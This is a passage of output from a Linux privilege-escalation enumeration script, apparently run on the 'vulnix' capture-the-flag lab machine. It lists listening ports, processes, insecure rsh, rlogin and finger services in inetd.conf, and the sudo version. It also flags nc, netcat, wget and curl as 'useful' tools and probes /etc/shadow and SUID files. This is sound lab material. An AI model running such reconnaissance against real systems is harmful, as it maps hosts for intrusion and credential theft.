-rwxr-xr-x  1 root root  730 Dec 31  2011 apt-xapian-index
-rwxr-xr-x  1 root root  907 Mar 31  2012 man-db
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:0c:29:76:09:06  
          inet addr:192.168.88.134  Bcast:192.168.88.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe76:906/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:237784 errors:0 dropped:0 overruns:0 frame:0
          TX packets:214428 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:23188391 (23.1 MB)  TX bytes:23105913 (23.1 MB)
          Interrupt:18 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:4 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:260 (260.0 B)  TX bytes:260 (260.0 B)


[-] ARP history:
? (192.168.88.254) at 00:50:56:f7:8f:d0 [ether] on eth0
? (192.168.88.2) at 00:50:56:fe:4e:c1 [ether] on eth0
? (192.168.88.128) at 00:0c:29:2c:0f:aa [ether] on eth0


[-] Nameserver(s):
nameserver 192.168.88.2


[-] Default route:
default         192.168.88.2    0.0.0.0         UG    100    0        0 eth0


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:38839           0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:54775           0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:57722           0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:59621           0.0.0.0:*               LISTEN      -                
tcp        0      0 0.0.0.0:38568           0.0.0.0:*               LISTEN      -                
tcp6       0      0 :::110                  :::*                    LISTEN      -                
tcp6       0      0 :::143                  :::*                    LISTEN      -                
tcp6       0      0 :::111                  :::*                    LISTEN      -                
tcp6       0      0 :::22                   :::*                    LISTEN      -                
tcp6       0      0 :::25                   :::*                    LISTEN      -                
tcp6       0      0 :::56089                :::*                    LISTEN      -                
tcp6       0      0 :::51233                :::*                    LISTEN      -                
tcp6       0      0 :::2049                 :::*                    LISTEN      -                
tcp6       0      0 :::993                  :::*                    LISTEN      -                
tcp6       0      0 :::57281                :::*                    LISTEN      -                
tcp6       0      0 :::37539                :::*                    LISTEN      -                
tcp6       0      0 :::995                  :::*                    LISTEN      -                
tcp6       0      0 :::49831                :::*                    LISTEN      -                


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:50138           0.0.0.0:*                           -                
udp        0      0 127.0.0.1:987           0.0.0.0:*                           -                
udp        0      0 0.0.0.0:40412           0.0.0.0:*                           -                
udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -                
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                
udp        0      0 0.0.0.0:40033           0.0.0.0:*                           -                
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                
udp        0      0 0.0.0.0:39546           0.0.0.0:*                           -                
udp        0      0 0.0.0.0:42654           0.0.0.0:*                           -                
udp        0      0 0.0.0.0:857             0.0.0.0:*                           -                
udp6       0      0 :::54698                :::*                                -                
udp6       0      0 :::53717                :::*                                -                
udp6       0      0 :::49656                :::*                                -                
udp6       0      0 :::2049                 :::*                                -                
udp6       0      0 :::111                  :::*                                -                
udp6       0      0 :::59004                :::*                                -                
udp6       0      0 :::42201                :::*                                -                
udp6       0      0 :::857                  :::*                                -     


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   3512  1920 ?        Ss   15:33   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    15:33   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    15:33   0:00 [ksoftirqd/0]
root         6  0.0  0.0      0     0 ?        S    15:33   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S    15:33   0:00 [watchdog/0]
root         8  0.0  0.0      0     0 ?        S    15:33   0:00 [migration/1]
root        10  0.0  0.0      0     0 ?        S    15:33   0:00 [ksoftirqd/1]
root        11  0.0  0.0      0     0 ?        S    15:33   0:01 [kworker/0:1]
root        12  0.0  0.0      0     0 ?        S    15:33   0:00 [watchdog/1]
root        13  0.0  0.0      0     0 ?        S<   15:33   0:00 [cpuset]
root        14  0.0  0.0      0     0 ?        S<   15:33   0:00 [khelper]
root        15  0.0  0.0      0     0 ?        S    15:33   0:00 [kdevtmpfs]
root        16  0.0  0.0      0     0 ?        S<   15:33   0:00 [netns]
root        18  0.0  0.0      0     0 ?        S    15:33   0:00 [sync_supers]
root        19  0.0  0.0      0     0 ?        S    15:33   0:00 [bdi-default]
root        20  0.0  0.0      0     0 ?        S<   15:33   0:00 [kintegrityd]
root        21  0.0  0.0      0     0 ?        S<   15:33   0:00 [kblockd]
root        22  0.0  0.0      0     0 ?        S<   15:33   0:00 [ata_sff]
root        23  0.0  0.0      0     0 ?        S    15:33   0:00 [khubd]
root        24  0.0  0.0      0     0 ?        S<   15:33   0:00 [md]
root        26  0.0  0.0      0     0 ?        S    15:33   0:00 [khungtaskd]
root        27  0.0  0.0      0     0 ?        S    15:33   0:00 [kswapd0]
root        28  0.0  0.0      0     0 ?        SN   15:33   0:00 [ksmd]
root        29  0.0  0.0      0     0 ?        SN   15:33   0:00 [khugepaged]
root        30  0.0  0.0      0     0 ?        S    15:33   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    15:33   0:00 [ecryptfs-kthrea]
root        32  0.0  0.0      0     0 ?        S<   15:33   0:00 [crypto]
root        40  0.0  0.0      0     0 ?        S<   15:33   0:00 [kthrotld]
root        41  0.0  0.0      0     0 ?        S    15:33   0:00 [scsi_eh_0]
root        42  0.0  0.0      0     0 ?        S    15:33   0:00 [scsi_eh_1]
root        63  0.0  0.0      0     0 ?        S<   15:33   0:00 [devfreq_wq]
root        64  0.0  0.0      0     0 ?        S    15:33   0:00 [kworker/1:1]
root       103  0.0  0.0      0     0 ?        S    15:33   0:00 [kworker/1:2]
root       217  0.0  0.0      0     0 ?        S<   15:33   0:00 [mpt_poll_0]
root       218  0.0  0.0      0     0 ?        S<   15:33   0:00 [mpt/0]
root       241  0.0  0.0      0     0 ?        S    15:33   0:00 [scsi_eh_2]
root       253  0.0  0.0      0     0 ?        S<   15:33   0:00 [kdmflush]
root       265  0.0  0.0      0     0 ?        S<   15:33   0:00 [kdmflush]
root       274  0.0  0.0      0     0 ?        S    15:33   0:00 [jbd2/dm-0-8]
root       275  0.0  0.0      0     0 ?        S<   15:33   0:00 [ext4-dio-unwrit]
root       470  0.0  0.0   2816   612 ?        S    15:33   0:00 upstart-udev-bridge --daemon
root       474  0.0  0.1   3044  1244 ?        Ss   15:33   0:00 /sbin/udevd --daemon
root       558  0.0  0.0   3000   776 ?        S    15:33   0:00 /sbin/udevd --daemon
root       559  0.0  0.0   3008   772 ?        S    15:33   0:00 /sbin/udevd --daemon
root       592  0.0  0.0      0     0 ?        S<   15:33   0:00 [kpsmoused]
root       693  0.0  0.0   2828   348 ?        S    15:33   0:00 upstart-socket-bridge --daemon
root       704  0.0  0.0   2680  1008 ?        Ss   15:33   0:00 rpcbind -w
root       770  0.0  0.0      0     0 ?        S<   15:33   0:00 [rpciod]
root       788  0.0  0.0      0     0 ?        S<   15:33   0:00 [nfsiod]
102        803  0.0  0.0   3240   880 ?        Ss   15:33   0:00 dbus-daemon --system --fork --activation=upstart
root       804  0.0  0.0   2892   860 ?        Ss   15:33   0:00 rpc.idmapd
syslog     808  0.0  0.1  31044  1400 ?        Sl   15:33   0:03 rsyslogd -c5
statd      811  0.0  0.1   2984  1360 ?        Ss   15:33   0:00 rpc.statd -L
root       854  0.0  0.0   2908   808 ?        Ss   15:33   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -1 eth0
root       876  0.0  0.2   6664  2412 ?        Ss   15:33   0:01 /usr/sbin/sshd -D
root       957  0.0  0.0   4612   836 tty4     Ss+  15:33   0:00 /sbin/getty -8 38400 tty4
root       963  0.0  0.0   4612   832 tty5     Ss+  15:33   0:00 /sbin/getty -8 38400 tty5
root       975  0.0  0.0   4612   840 tty2     Ss+  15:33   0:00 /sbin/getty -8 38400 tty2
root       976  0.0  0.0   4612   844 tty3     Ss+  15:33   0:00 /sbin/getty -8 38400 tty3
root       979  0.0  0.0   4612   836 tty6     Ss+  15:33   0:00 /sbin/getty -8 38400 tty6
root       983  0.0  0.0   2412   716 ?        S    15:33   0:00 /usr/sbin/inetutils-inetd
root       993  0.0  0.1   2992  1196 ?        Ss   15:33   0:01 /usr/sbin/dovecot -F -c /etc/dovecot/dovecot.conf
root      1000  0.0  0.0   2156   604 ?        Ss   15:33   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root      1001  0.0  0.0   2600   768 ?        Ss   15:33   0:00 cron
daemon    1002  0.0  0.0   2452   348 ?        Ss   15:33   0:00 atd
root      1027  0.0  0.0   3584   636 ?        Ss   15:33   0:02 /usr/sbin/irqbalance
dovecot   1032  0.0  0.0   2832   976 ?        S    15:33   0:00 dovecot/anvil
root      1033  0.0  0.0   2820   992 ?        S    15:33   0:00 dovecot/log
whoopsie  1035  0.0  0.3  24440  3756 ?        Ssl  15:33   0:00 whoopsie
root      1057  0.0  0.0      0     0 ?        S    15:33   0:00 [lockd]
root      1058  0.0  0.0      0     0 ?        S<   15:33   0:00 [nfsd4]
root      1059  0.0  0.0      0     0 ?        S<   15:33   0:00 [nfsd4_callbacks]
root      1060  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1061  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1062  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1063  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1064  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1065  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1066  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1067  0.0  0.0      0     0 ?        S    15:33   0:00 [nfsd]
root      1072  0.0  0.1   3568  1748 ?        Ss   15:33   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1176  0.0  0.1   4560  1464 ?        Ss   15:33   0:00 /usr/lib/postfix/master
postfix   1179  0.0  0.1   4580  1320 ?        S    15:33   0:00 pickup -l -t fifo -u -c
postfix   1180  0.0  0.1   4628  1344 ?        S    15:33   0:00 qmgr -l -t fifo -u
root      1219  0.0  0.0   4612   840 tty1     Ss+  15:33   0:00 /sbin/getty -8 38400 tty1
postfix   1236  0.0  0.2   7172  2616 ?        S    15:37   0:00 tlsmgr -l -t unix -u -c
root      9762  0.0  0.0      0     0 ?        S    16:10   0:00 [flush-252:0]
root     11842  0.0  0.0      0     0 ?        S    17:28   0:00 [kworker/u:2]
root     12078  0.0  0.0      0     0 ?        S    17:34   0:00 [kworker/u:1]
root     12079  0.0  0.0      0     0 ?        S    17:39   0:00 [kworker/0:0]
root     12094  0.0  0.2   9600  3060 ?        Ss   17:43   0:00 sshd: vulnix [priv] 
vulnix   12216  0.0  0.1   9600  1464 ?        S    17:43   0:00 sshd: vulnix@pts/0  
vulnix   12217  0.5  0.6   9752  6192 pts/0    Ss   17:43   0:00 -bash
root     12318  0.0  0.0      0     0 ?        S    17:44   0:00 [kworker/0:2]
vulnix   12327  3.6  0.1   5600  1632 pts/0    S+   17:45   0:00 bash
vulnix   12328  0.6  0.1   5664  1356 pts/0    S+   17:45   0:00 bash
vulnix   12329  0.0  0.0   4212   588 pts/0    S+   17:45   0:00 tee -a
vulnix   12543  0.0  0.1   5664  1080 pts/0    S+   17:45   0:00 bash
vulnix   12544  0.0  0.1   4924  1156 pts/0    R+   17:45   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
 28K -rwxr-xr-x 2 root root  27K Mar 30  2012 /sbin/getty
188K -rwxr-xr-x 1 root root 186K Apr 26  2012 /sbin/init
176K -rwxr-xr-x 1 root root 174K Jul 19  2012 /sbin/udevd
 40K -rwxr-xr-x 1 root root  38K Jul 30  2012 /usr/lib/postfix/master
 64K -rwxr-xr-x 1 root root  62K Jun 29  2012 /usr/sbin/dovecot
 64K -rwxr-xr-x 1 root root  63K Jan  3  2012 /usr/sbin/inetutils-inetd
 28K -rwxr-xr-x 1 root root  26K Feb  4  2012 /usr/sbin/irqbalance
260K -rwxr-xr-x 1 root root 257K Apr  9  2012 /usr/sbin/rpc.mountd
516K -rwxr-xr-x 1 root root 516K Apr  2  2012 /usr/sbin/sshd

[-] Contents of /etc/inetd.conf:
# /etc/inetd.conf:  see inetd(8) for further informations.
#
# Internet superserver configuration database
#
#
# Lines starting with "#:LABEL:" or "#<off>#" should not
# be changed unless you know what you are doing!
#
# If you want to disable an entry so it isn't touched during
# package updates just comment it out with a single '#' character.
#
# Packages should modify this file by using update-inetd(8)
#
# <service_name> <sock_type> <proto> <flags> <user> <server_path> <args>
#
#:INTERNAL: Internal services
#discard                stream  tcp     nowait  root    internal
#discard                dgram   udp     wait    root    internal
#daytime                stream  tcp     nowait  root    internal
#time           stream  tcp     nowait  root    internal

#:STANDARD: These are standard services.

#:BSD: Shell, login, exec and talk are BSD protocols.
shell           stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/in.rshd
login           stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/in.rlogind
exec            stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/in.rexecd

#:MAIL: Mail, news and uucp services.

#:INFO: Info services
finger          stream  tcp     nowait  nobody  /usr/sbin/tcpd  /usr/sbin/in.fingerd

#:BOOT: TFTP service is provided primarily for booting.  Most sites
#       run this only on machines acting as "boot servers."

#:RPC: RPC based services

#:HAM-RADIO: amateur-radio services

#:OTHER: Other services


[-] The related inetd binary permissions:
-rwxr-xr-x 1 root root  9928 May  9  2010 /usr/sbin/in.fingerd
-rwxr-xr-x 1 root root  9968 Jun 26  2010 /usr/sbin/in.rexecd
-rwxr-xr-x 1 root root 18268 Jun 26  2010 /usr/sbin/in.rlogind
-rwxr-xr-x 1 root root 18580 Jun 26  2010 /usr/sbin/in.rshd

[-] /etc/init.d/ binary permissions:
total 160
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 Jan  5 16:33 ..
lrwxrwxrwx  1 root root   21 Dec  8  2011 acpid -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4596 Apr 12  2012 apparmor
lrwxrwxrwx  1 root root   21 Jul 27  2012 apport -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Oct 25  2011 atd -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 2444 Jul 26  2012 bootlogd
lrwxrwxrwx  1 root root   21 Apr 19  2012 console-setup -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jun 19  2012 cron -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Feb 22  2012 dbus -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 30  2012 dmesg -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1242 Dec 13  2011 dns-clean
lrwxrwxrwx  1 root root   21 Jun 29  2012 dovecot -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 14  2012 friendly-recovery -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1105 May 17  2012 grub-common
lrwxrwxrwx  1 root root   21 Apr  9  2012 gssd -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1329 Jul 26  2012 halt 
lrwxrwxrwx  1 root root   21 May 26  2011 hostname -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 30  2012 hwclock -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 30  2012 hwclock-save -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  9  2012 idmapd -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1925 Nov  4  2011 inetutils-inetd
lrwxrwxrwx  1 root root   21 Feb  4  2012 irqbalance -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1293 Jul 26  2012 killprocs
-rw-r--r--  1 root root    0 Sep  2  2012 .legacy-bootordering
lrwxrwxrwx  1 root root   21 Nov 20  2011 module-init-tools -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 2797 Feb 13  2012 networking
lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface-container -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface-security -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4796 Apr  9  2012 nfs-kernel-server
-rwxr-xr-x  1 root root  882 Jul 26  2012 ondemand
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-log -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-splash -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-stop -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-upstart-bridge -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 May 31  2012 portmap -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 May 31  2012 portmap-wait -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 7355 Jul 30  2012 postfix
-rwxr-xr-x  1 root root  561 Feb  4  2011 pppd-dns
lrwxrwxrwx  1 root root   21 Dec 12  2011 procps -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 8635 Jul 26  2012 rc
-rwxr-xr-x  1 root root  801 Jul 26  2012 rc.local
-rwxr-xr-x  1 root root  117 Jul 26  2012 rcS
-rw-r--r--  1 root root 2427 Jul 26  2012 README
-rwxr-xr-x  1 root root  639 Jul 26  2012 reboot
lrwxrwxrwx  1 root root   21 Jul 21  2012 resolvconf -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 May 31  2012 rpcbind-boot -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4395 Nov  8  2011 rsync
lrwxrwxrwx  1 root root   21 Mar 30  2012 rsyslog -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jun  6  2011 screen-cleanup -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4321 Jul 26  2012 sendsigs
lrwxrwxrwx  1 root root   21 Apr 19  2012 setvtrgb -> /lib/init/upstart-job
-rwxr-xr-x  1 root root  590 Jul 26  2012 single
-rw-r--r--  1 root root 4304 Jul 26  2012 skeleton
-rwxr-xr-x  1 root root 4371 Apr  2  2012 ssh
lrwxrwxrwx  1 root root   21 Apr  9  2012 statd -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  9  2012 statd-mounting -> /lib/init/upstart-job
-rwxr-xr-x  1 root root  567 Jul 26  2012 stop-bootlogd
-rwxr-xr-x  1 root root 1143 Jul 26  2012 stop-bootlogd-single
-rwxr-xr-x  1 root root  700 May 23  2012 sudo 
rwxrwxrwx  1 root root   21 Jul 19  2012 udev -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udev-fallback-graphics -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udev-finish -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udevmonitor -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udevtrigger -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  5  2012 ufw -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 2800 Jul 26  2012 umountfs
-rwxr-xr-x  1 root root 2211 Jul 26  2012 umountnfs.sh
-rwxr-xr-x  1 root root 2926 Jul 26  2012 umountroot
-rwxr-xr-x  1 root root 1985 Jul 26  2012 urandom
lrwxrwxrwx  1 root root   21 Apr 18  2012 whoopsie -> /lib/init/upstart-job

[-] /etc/init/ config file permissions:
total 300
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 Jan  5 16:33 ..
-rw-r--r--  1 root root  320 Dec  8  2011 acpid.conf
-rw-r--r--  1 root root 1309 Jul 27  2012 apport.conf
-rw-r--r--  1 root root  261 Oct 25  2011 atd.conf
-rw-r--r--  1 root root  266 Apr 26  2012 console.conf
-rw-r--r--  1 root root  509 Dec 21  2010 console-setup.conf
-rw-r--r--  1 root root 1122 Apr 26  2012 container-detect.conf
-rw-r--r--  1 root root  356 Apr 26  2012 control-alt-delete.conf
-rw-r--r--  1 root root  297 Jun 19  2012 cron.conf
-rw-r--r--  1 root root  510 Jan 10  2012 dbus.conf
-rw-r--r--  1 root root  273 Mar 30  2012 dmesg.conf
-rw-r--r--  1 root root 1096 Jun 28  2012 dovecot.conf
-rw-r--r--  1 root root 1377 Apr 26  2012 failsafe.conf
-rw-r--r--  1 root root  267 Apr 26  2012 flush-early-job-log.conf
-rw-r--r--  1 root root 1247 Mar 14  2012 friendly-recovery.conf
-rw-r--r--  1 root root 1985 Mar 27  2012 gssd.conf
-rw-r--r--  1 root root  317 May 26  2011 hostname.conf
-rw-r--r--  1 root root  557 Mar 30  2012 hwclock.conf
-rw-r--r--  1 root root  444 Mar 30  2012 hwclock-save.conf
-rw-r--r--  1 root root  976 Mar 27  2012 idmapd.conf
-rw-r--r--  1 root root  571 Feb  4  2012 irqbalance.conf
-rw-r--r--  1 root root  367 Mar 18  2011 module-init-tools.conf
-rw-r--r--  1 root root  943 Apr 12  2012 mountall.conf
-rw-r--r--  1 root root  349 Apr 12  2012 mountall-net.conf
-rw-r--r--  1 root root  261 Apr 12  2012 mountall-reboot.conf
-rw-r--r--  1 root root 1201 Apr 12  2012 mountall-shell.conf
-rw-r--r--  1 root root  405 Apr 12  2012 mounted-debugfs.conf
-rw-r--r--  1 root root  550 Apr 12  2012 mounted-dev.conf
-rw-r--r--  1 root root  480 Apr 12  2012 mounted-proc.conf
-rw-r--r--  1 root root  610 Apr 12  2012 mounted-run.conf
-rw-r--r--  1 root root 1890 Apr 12  2012 mounted-tmp.conf
-rw-r--r--  1 root root  903 Apr 12  2012 mounted-var.conf
-rw-r--r--  1 root root  388 Apr  5  2012 networking.conf
-rw-r--r--  1 root root  803 Apr  5  2012 network-interface.conf
-rw-r--r--  1 root root  523 Apr  5  2012 network-interface-container.conf
-rw-r--r--  1 root root 1603 Apr  5  2012 network-interface-security.conf
-rw-r--r--  1 root root  971 Nov  9  2011 plymouth.conf
-rw-r--r--  1 root root  326 Mar 26  2010 plymouth-log.conf
-rw-r--r--  1 root root  899 Mar 18  2011 plymouth-splash.conf
-rw-r--r--  1 root root  800 Apr 13  2012 plymouth-stop.conf
-rw-r--r--  1 root root  367 Jan 25  2011 plymouth-upstart-bridge.conf
-rw-r--r--  1 root root  853 May 30  2012 portmap.conf
-rw-r--r--  1 root root  805 May 30  2012 portmap-wait.conf
-rw-r--r--  1 root root  363 Dec  5  2011 procps.conf
-rw-r--r--  1 root root  454 Apr 26  2012 rc.conf
-rw-r--r--  1 root root  705 Apr 26  2012 rcS.conf
-rw-r--r--  1 root root 1543 Apr 26  2012 rc-sysinit.conf
-rw-r--r--  1 root root  457 Jul 18  2012 resolvconf.conf
-rw-r--r--  1 root root  209 May 30  2012 rpcbind-boot.conf
-rw-r--r--  1 root root  426 Mar 30  2012 rsyslog.conf
-rw-r--r--  1 root root  683 Jun  6  2011 screen-cleanup.conf
-rw-r--r--  1 root root  230 Mar 18  2011 setvtrgb.conf
-rw-r--r--  1 root root  277 Apr 26  2012 shutdown.conf
-rw-r--r--  1 root root  667 Feb  6  2012 ssh.conf
-rw-r--r--  1 root root 1188 Mar 27  2012 statd.conf
-rw-r--r--  1 root root  738 Mar 27  2012 statd-mounting.conf
-rw-r--r--  1 root root  348 Apr 26  2012 tty1.conf
-rw-r--r--  1 root root  333 Apr 26  2012 tty2.conf
-rw-r--r--  1 root root  333 Apr 26  2012 tty3.conf
-rw-r--r--  1 root root  333 Apr 26  2012 tty4.conf
-rw-r--r--  1 root root  232 Apr 26  2012 tty5.conf
-rw-r--r--  1 root root  232 Apr 26  2012 tty6.conf
-rw-r--r--  1 root root  322 Nov 15  2011 udev.conf
-rw-r--r--  1 root root  637 Jul 16  2012 udev-fallback-graphics.conf
-rw-r--r--  1 root root  769 Oct 21  2011 udev-finish.conf
-rw-r--r--  1 root root  356 Oct 21  2011 udevmonitor.conf
-rw-r--r--  1 root root  352 Jul 16  2012 udevtrigger.conf
-rw-r--r--  1 root root  473 Apr  5  2012 ufw.conf
-rw-r--r--  1 root root  329 Apr 26  2012 upstart-socket-bridge.conf
-rw-r--r--  1 root root  553 Apr 26  2012 upstart-udev-bridge.conf
-rw-r--r--  1 root root  889 Feb  4  2012 ureadahead.conf
-rw-r--r--  1 root root  683 Feb  4  2012 ureadahead-other.conf
-rw-r--r--  1 root root 1481 Apr 26  2012 wait-for-state.conf
-rw-r--r--  1 root root  362 Apr 18  2012 whoopsie.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 4.0K
drwxr-xr-x 6 root root 4.0K Sep  2  2012 system

/lib/systemd/system:
total 56K
drwxr-xr-x 2 root root 4.0K Sep  2  2012 dbus.target.wants
drwxr-xr-x 2 root root 4.0K Sep  2  2012 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Sep  2  2012 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Sep  2  2012 basic.target.wants
-rw-r--r-- 1 root root  433 Aug  2  2012 accounts-daemon.service
-rw-r--r-- 1 root root  164 Jul 19  2012 udev-control.socket
-rw-r--r-- 1 root root  177 Jul 19  2012 udev-kernel.socket
-rw-r--r-- 1 root root  341 Jul 19  2012 udev.service
-rw-r--r-- 1 root root  752 Jul 19  2012 udev-settle.service
-rw-r--r-- 1 root root  291 Jul 19  2012 udev-trigger.service
-rw-r--r-- 1 root root  231 Mar 30  2012 rsyslog.service
-rw-r--r-- 1 root root  419 Feb 22  2012 dbus.service
-rw-r--r-- 1 root root  106 Feb 22  2012 dbus.socket
-rw-r--r-- 1 root root  188 Nov  8  2011 rsync.service

/lib/systemd/system/dbus.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Feb 22  2012 dbus.socket -> ../dbus.socket

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Feb 22  2012 dbus.service -> ../dbus.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 22 Jul 19  2012 udev-control.socket -> ../udev-control.socket
lrwxrwxrwx 1 root root 21 Jul 19  2012 udev-kernel.socket -> ../udev-kernel.socket
lrwxrwxrwx 1 root root 14 Feb 22  2012 dbus.socket -> ../dbus.socket

/lib/systemd/system/basic.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Jul 19  2012 udev.service -> ../udev.service
lrwxrwxrwx 1 root root 23 Jul 19  2012 udev-trigger.service -> ../udev-trigger.service

### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.3p1


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1312 Sep  2  2012 /etc/passwd
-rw-r--r-- 1 root root 720 Sep  2  2012 /etc/group
-rw-r--r-- 1 root root 665 Sep  2  2012 /etc/profile
-rw-r----- 1 root shadow 1111 Sep  2  2012 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 96904 Apr  9  2012 /sbin/mount.nfs
